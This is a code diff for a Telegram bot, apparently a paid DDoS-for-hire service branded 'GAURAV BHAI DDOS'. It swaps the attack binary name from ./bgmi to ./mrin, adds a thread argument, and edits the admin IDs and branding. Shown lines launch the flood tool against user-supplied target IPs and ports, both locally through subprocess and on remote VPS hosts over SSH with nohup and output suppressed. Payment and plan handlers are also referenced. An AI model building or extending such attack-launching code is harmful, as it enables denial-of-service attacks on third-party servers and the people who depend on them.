@@ -80,7 +80,7 @@ keyboard.add(telebot.types.KeyboardButton("HELP"))
 
 
 
-#GAURAV BHAI HACK#
+#GAURAV#
 
 user_screenshot_status = {}
 
@@ -88,7 +88,7 @@ user_screenshot_hash = {}
 
 
 
-REFERENCE_IMAGE_URL = 'https://files.catbox.moe/kohlku.jpg'
+REFERENCE_IMAGE_URL = 'http://example.com/path/to/your/image.jpg'
 
 # Function to get the hash of an image
 
@@ -288,7 +288,7 @@ def start_attack_reply(message, target, port, duration):
 
     # Start the actual attack using subprocess
 
-    subprocess.run(f"./bgmi {target} {port} {duration}", shell=True)
+    subprocess.run(f"./mrin {target} {port} {duration} 300", shell=True)
 
     
 
@@ -310,7 +310,7 @@ def send_welcome(message):
 
     
 
-    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **@GAURAV_BHAI1 DDOS**! 💥
+    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GAURAV BHAI DDOS**! 💥
 
     
 
@@ -1316,7 +1316,7 @@ def handle_vps_selection(message):
 
 
 
-        command = f"cd Alone && nohup ./bgmi {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} > /dev/null 2>&1 &"
+        command = f"cd Alone && nohup ./mrin {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} 300 > /dev/null 2>&1 &"
 
         ssh.exec_command(command)
 
@@ -1494,7 +1494,7 @@ def help_button(message):
 
         usage /vpsremove <vps name>
 
-        example /vpsremove GAURAVBHAI1 
+        example /vpsremove gaurav 
 
        
 
@@ -1528,7 +1528,7 @@ def pay_button(message):
 
 # Replace 'admin_chat_id' with the actual chat ID of the admin
 
-admin_chat_id = '6539807903'
+admin_chat_id = '1662672529'
 
 
 
@@ -1578,7 +1578,7 @@ def plan_button(message):
 
 
 
-    𝗔𝗗𝗠𝗜𝗡 -- ( @GAURAV_BHAI1 ) 👑
+    𝗔𝗗𝗠𝗜𝗡 -- ( @GAURAV_BHAI1) 👑
 
 
 
